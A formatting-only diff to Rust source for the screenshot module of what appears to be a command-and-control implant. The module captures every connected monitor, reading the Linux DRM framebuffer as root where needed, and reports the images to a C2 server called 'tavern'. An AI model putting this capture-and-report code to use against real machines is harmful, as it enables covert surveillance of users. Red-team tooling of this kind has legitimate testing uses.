@@ -7,21 +7,20 @@ use {
     pb::c2::report_file_request,
     pb::{c2, eldritch},
     std::io::Cursor,
-    std::sync::Mutex
+    std::sync::Mutex,
 };
 
 #[cfg(any(target_os = "windows", target_os = "macos"))]
-use {
-    alloc::format,
-    image::ImageFormat,
-    xcap::Monitor
-};
+use {alloc::format, image::ImageFormat, xcap::Monitor};
 
 #[cfg(target_os = "linux")]
 use {
-    drm::control::{connector::State, Device as Ctl},
-    std::{fs::{File, OpenOptions}, os::fd::{AsFd, BorrowedFd}},
-    framebuffer::Framebuffer
+    drm::control::{Device as Ctl, connector::State},
+    framebuffer::Framebuffer,
+    std::{
+        fs::{File, OpenOptions},
+        os::fd::{AsFd, BorrowedFd},
+    },
 };
 
 #[cfg(all(any(target_os = "macos", target_os = "linux"), feature = "stdlib"))]
@@ -48,20 +47,27 @@ pub fn screenshot(_agent: Arc<dyn Agent>, _context: Context) -> Result<(), Strin
     )
 }
 
-fn report_to_tavern(agent: &Arc<dyn Agent>, context: &Context, image: &RgbaImage, monitor: usize) -> Result<(), String> {
+fn report_to_tavern(
+    agent: &Arc<dyn Agent>,
+    context: &Context,
+    image: &RgbaImage,
+    monitor: usize,
+) -> Result<(), String> {
     // get hostname and timestamp
     let hostname = get_hostname();
     let timestamp = std::time::SystemTime::now()
-            .duration_since(std::time::UNIX_EPOCH)
-            .unwrap_or_default()
-            .as_secs();
+        .duration_since(std::time::UNIX_EPOCH)
+        .unwrap_or_default()
+        .as_secs();
 
     // get the filename
     let filename = format!("screenshot_{}_{}_{}.png", hostname, timestamp, monitor);
 
     // write PNG data
     let mut buffer = Cursor::new(Vec::new());
-    image.write_to(&mut buffer, ImageFormat::Png).map_err(|e| e.to_string())?;
+    image
+        .write_to(&mut buffer, ImageFormat::Png)
+        .map_err(|e| e.to_string())?;
     let png_data = buffer.into_inner();
 
     // Prepare context
@@ -144,7 +150,11 @@ fn report_to_tavern(agent: &Arc<dyn Agent>, context: &Context, image: &RgbaImage
 #[cfg(target_os = "linux")]
 struct Card(File);
 #[cfg(target_os = "linux")]
-impl AsFd for Card { fn as_fd(&self) -> BorrowedFd<'_> { self.0.as_fd() } }
+impl AsFd for Card {
+    fn as_fd(&self) -> BorrowedFd<'_> {
+        self.0.as_fd()
+    }
+}
 #[cfg(target_os = "linux")]
 impl drm::Device for Card {}
 #[cfg(target_os = "linux")]
@@ -152,25 +162,45 @@ impl Ctl for Card {}
 
 #[cfg(target_os = "linux")]
 fn grab_drm_screenshot() -> Result<Vec<image::RgbaImage>, Box<dyn std::error::Error>> {
-    let card = Card(OpenOptions::new().read(true).write(true).open("/dev/dri/card0")?);
+    let card = Card(
+        OpenOptions::new()
+            .read(true)
+            .write(true)
+            .open("/dev/dri/card0")?,
+    );
     let mut out = vec![];
     for c in card.resource_handles()?.connectors() {
         let info = card.get_connector(*c, false)?;
-        if info.state() != State::Connected { continue; }
-        let Some(crtc) = info.current_encoder()
+        if info.state() != State::Connected {
+            continue;
+        }
+        let Some(crtc) = info
+            .current_encoder()
             .and_then(|e| card.get_encoder(e).ok())
-            .and_then(|e| e.crtc()) else { continue };
-        let Some(fb) = card.get_crtc(crtc)?.framebuffer() else { continue };
+            .and_then(|e| e.crtc())
+        else {
+            continue;
+        };
+        let Some(fb) = card.get_crtc(crtc)?.framebuffer() else {
+            continue;
+        };
         let fb = card.get_planar_framebuffer(fb)?;
         let (w, h) = fb.size();
         let pitch = fb.pitches()[0] as usize;
-        let fd = card.buffer_to_prime_fd(fb.buffers()[0].ok_or("need root (CAP_SYS_ADMIN)")?, 0x80000)?; // O_CLOEXEC
-        let map = unsafe { memmap2::MmapOptions::new().len(pitch * h as usize).map(&fd)? };
+        let fd =
+            card.buffer_to_prime_fd(fb.buffers()[0].ok_or("need root (CAP_SYS_ADMIN)")?, 0x80000)?; // O_CLOEXEC
+        let map = unsafe {
+            memmap2::MmapOptions::new()
+                .len(pitch * h as usize)
+                .map(&fd)?
+        };
 
         // XRGB8888 (BGRX in memory) -> RGBA, skipping row padding
         let mut px = Vec::with_capacity((w * h * 4) as usize);
         for row in map.chunks(pitch).take(h as usize) {
-            for p in row[..w as usize * 4].chunks(4) { px.extend([p[2], p[1], p[0], 255]); }
+            for p in row[..w as usize * 4].chunks(4) {
+                px.extend([p[2], p[1], p[0], 255]);
+            }
         }
         out.push(image::RgbaImage::from_raw(w, h, px).unwrap());
     }
@@ -185,7 +215,9 @@ fn screenshot_fb0() -> Result<image::RgbaImage, Box<dyn std::error::Error>> {
     let data = fb.read_frame(); // assumes 32bpp BGRA
     let mut px = Vec::with_capacity((w * h * 4) as usize);
     for row in data.chunks(pitch).take(h as usize) {
-        for p in row[..w as usize * 4].chunks(4) { px.extend([p[2], p[1], p[0], 255]); }
+        for p in row[..w as usize * 4].chunks(4) {
+            px.extend([p[2], p[1], p[0], 255]);
+        }
     }
     Ok(image::RgbaImage::from_raw(w, h, px).unwrap())
 }
